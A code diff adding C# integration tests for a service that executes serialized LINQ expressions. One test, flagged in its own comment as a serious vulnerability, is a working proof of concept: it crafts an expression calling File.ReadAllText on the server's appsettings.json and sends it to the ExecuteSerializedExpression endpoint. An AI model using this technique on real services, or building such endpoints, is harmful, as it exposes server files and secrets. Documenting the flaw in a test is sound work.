@@ -6,6 +6,9 @@ using Stenn.TestModel.Domain.AppService.Tests.Entities;
 using FluentAssertions;
 using Stenn.TestModel.Domain.Tests;
 using Microsoft.EntityFrameworkCore;
+using System.Linq.Expressions;
+using Stenn.AppData;
+using System.Linq.CompilerServices.TypeSystem;
 
 namespace Stenn.TestModel.IntegrationTests
 {
@@ -66,6 +69,9 @@ namespace Stenn.TestModel.IntegrationTests
             return services;
         }
 
+        /// <summary>
+        /// Checking if webApp can precess responses
+        /// </summary>
         [Test]
         public async Task GetIndexTest()
         {
@@ -74,6 +80,9 @@ namespace Stenn.TestModel.IntegrationTests
             response.EnsureSuccessStatusCode();
         }
 
+        /// <summary>
+        /// AppDataClient builds expression and sends it to webApp. webApp executes expression on TestModelService to get data, serializes data and sends it back to client.
+        /// </summary>
         [Test]
         public void PostSerializedExpressionTest()
         {
@@ -91,6 +100,32 @@ namespace Stenn.TestModel.IntegrationTests
             var data = appDataClient.Query<TestModelCountry>().Take(5).ToList();
 
             data.Should().HaveCount(5);
+        }
+
+        /// <summary>
+        /// We can manually craft Expression to read remote service config. Looks like serious vulnerability
+        /// </summary>
+        [Test]
+        public void ReadRemoteConfigTest()
+        {
+            var httpClient = GetClient();
+
+            var pathExpression = Expression.Constant(Path.Combine(Directory.GetCurrentDirectory(), "appsettings.json"));
+            var ex = Expression.Call(typeof(File), "ReadAllText", null, pathExpression);
+            var param = Expression.Parameter(typeof(object), "service");
+            Expression<Func<object, string>> le = Expression.Lambda<Func<object, string>>(ex, new ParameterExpression[] { param });
+
+            var response = httpClient.PostAsync("/TestService/ExecuteSerializedExpression", new StringContent(SerializeExpression(le))).Result;
+            var bytes = response.Content.ReadAsByteArrayAsync().Result;
+            var result = System.Text.Json.JsonSerializer.Deserialize<string>(bytes);
+            result.Should().NotBeEmpty();
+        }
+
+        private string SerializeExpression(Expression expression)
+        {
+            var serializer = new ExpressionSerializer();
+            var slimExpression = serializer.Lift(expression);
+            return serializer.Serialize(slimExpression);
         }
     }
 }
